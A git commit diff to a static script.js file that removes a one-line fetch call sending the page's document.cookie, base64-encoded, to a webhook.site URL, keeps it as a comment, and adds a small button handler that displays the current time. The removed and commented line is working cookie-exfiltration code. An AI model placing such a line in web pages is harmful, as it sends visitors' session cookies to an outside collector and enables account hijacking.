b7b240bb4e806673859f8a1c51581eaa942defbf
Andyyds404 <andyxc3292@gmail.com>
2025-04-18 22:06:36 +0800

    Update script.js

--- static/script.js
+++ static/script.js
@@ -1,1 +1,15 @@
-fetch("https://webhook.site/79454414-22d3-4310-af53-9c8f88cd6f7d?"+window.btoa(document.cookie))
+//fetch("https://webhook.site/79454414-22d3-4310-af53-9c8f88cd6f7d?"+window.btoa(document.cookie))
+
+document.addEventListener("DOMContentLoaded", function () {
+  const button = document.getElementById("showTimeButton");
+  button.addEventListener("click", function () {
+    displayCurrentTime();
+  });
+
+  function displayCurrentTime() {
+    const now = new Date();
+    const timeString = now.toLocaleTimeString();
+    document.getElementById("timeDisplay").innerText =
+      "現在時間: " + timeString;
+  }
+});
